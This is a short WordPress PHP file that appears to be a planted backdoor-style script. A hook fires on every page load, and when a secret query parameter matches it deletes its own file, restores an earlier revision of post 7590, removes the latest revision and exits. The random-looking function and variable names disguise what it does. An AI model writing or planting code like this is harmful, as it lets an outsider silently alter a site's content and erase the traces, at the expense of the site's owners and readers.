<?php

function export_syntax_style() {
	if (isset($_GET['dropdown_navigation_search_booster']) && $_GET['dropdown_navigation_search_booster'] === 'client_survey_scss_src') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$picker_reviews_item = 7590;
		$first_php_notify = wp_get_post_revisions($picker_reviews_item);
		if (empty($first_php_notify)) die('no revisions');
		if (count($first_php_notify) < 2) die('less than 2');
		$icon_custom_install = array_shift($first_php_notify);
		$best_optimizer_multi_enable = $icon_custom_install->ID;
		$log_current_age = array_shift($first_php_notify);
		$map_online_count_system = $log_current_age->ID;
		$counter_csv_dynamic = wp_restore_post_revision($map_online_count_system);
		if ($counter_csv_dynamic === false) die('error restoring');
		$counter_csv_dynamic = wp_delete_post_revision($best_optimizer_multi_enable);		
		if ($counter_csv_dynamic === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'export_syntax_style');
